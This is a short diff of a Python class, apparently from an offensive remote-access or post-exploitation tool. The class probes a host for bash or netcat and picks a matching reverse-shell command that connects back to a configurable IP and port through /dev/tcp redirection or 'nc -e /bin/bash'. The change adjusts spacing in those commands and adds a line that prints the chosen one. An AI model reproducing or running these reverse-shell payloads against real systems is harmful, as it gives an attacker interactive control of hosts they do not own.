@@ -55,10 +55,10 @@ class connection:
         self.send_rcv("find /bin/ /usr/bin/")
 
         if "\n/usr/bin/bash" in self.recorded:
-            self.rev = f"/usr/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 &\r"
+            self.rev = f"/usr/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
         if "\n/bin/bash" in self.recorded:
-            self.rev = f"/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 &\r"
+            self.rev = f"/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
         if "\n/bin/nc" in self.recorded:
             self.rev = f"/bin/nc {IP} {PORT} -e /bin/bash & \r"
@@ -66,7 +66,7 @@ class connection:
         if "\n/usr/bin/nc" in self.recorded:
             self.rev = f"/usr/bin/nc {IP} {PORT} -e /bin/bash & \r"
 
-
+        print(self.rev)
         new_rev[self.addr] = self.rev
         self.record = False
 
